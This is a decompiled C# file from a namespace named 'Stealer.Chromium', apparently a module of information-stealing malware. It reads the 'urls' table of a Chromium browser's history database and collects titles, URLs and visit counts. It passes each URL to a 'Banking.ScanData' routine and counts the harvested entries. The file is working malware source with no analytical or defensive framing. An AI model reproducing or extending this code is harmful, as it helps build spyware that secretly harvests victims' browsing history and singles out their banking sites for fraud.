﻿using System;
using System.Collections.Generic;

namespace Stealer.Chromium
{
	// Token: 0x02000045 RID: 69
	internal sealed class History
	{
		// Token: 0x060000FB RID: 251 RVA: 0x000082FC File Offset: 0x000064FC
		public static List<Site> Get(string sHistory)
		{
			List<Site> result;
			try
			{
				List<Site> list = new List<Site>();
				SQLite sqlite = SqlReader.ReadTable(sHistory, "urls");
				if (sqlite == null)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						Site item = default(Site);
						item.sTitle = Crypto.GetUTF8(sqlite.GetValue(i, 1));
						item.sUrl = Crypto.GetUTF8(sqlite.GetValue(i, 2));
						item.iCount = Convert.ToInt32(sqlite.GetValue(i, 3)) + 1;
						Banking.ScanData(item.sUrl);
						Counter.History++;
						list.Add(item);
					}
					result = list;
				}
			}
			catch
			{
				result = new List<Site>();
			}
			return result;
		}
	}
}
